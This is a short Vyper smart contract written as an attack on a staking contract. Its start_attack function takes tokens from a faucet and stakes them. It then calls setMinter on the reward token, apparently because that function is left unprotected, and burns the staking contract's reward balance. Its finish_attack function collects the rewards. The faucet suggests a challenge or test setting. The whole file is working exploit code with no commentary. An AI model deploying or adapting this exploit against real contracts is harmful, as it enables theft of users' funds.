# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

interface IStaking:
    def stakingToken() -> address: view
    def rewardTokens(x: uint256) -> address: view
    def stake(amount: uint256): nonpayable
    def getReward(): nonpayable

interface IReward:
    def setMinter(_minter: address): nonpayable
    def burnFrom(_to: address, _value: uint256): nonpayable

owner: immutable(address)

staking: IStaking
staking_token: public(address)
reward_token: public(address)

@external
@payable
def __init__(_staking: IStaking):
    owner = msg.sender
    self.staking = _staking
    self.staking_token = self.staking.stakingToken()
    self.reward_token = self.staking.rewardTokens(0)

@external
def start_attack():
    assert msg.sender == owner, "!owner"
    raw_call(self.staking_token, method_id("faucet()"))
    staking_token_bal: uint256 = IERC20(self.staking_token).balanceOf(self)
    IERC20(self.staking_token).approve(self.staking.address, staking_token_bal)
    self.staking.stake(staking_token_bal)
    IReward(self.reward_token).setMinter(self)
    IReward(self.reward_token).burnFrom(
        self.staking.address, 
        IERC20(self.reward_token).balanceOf(self.staking.address),
    )

@external
def finish_attack():
    assert msg.sender == owner, "!owner"
    self.staking.getReward()
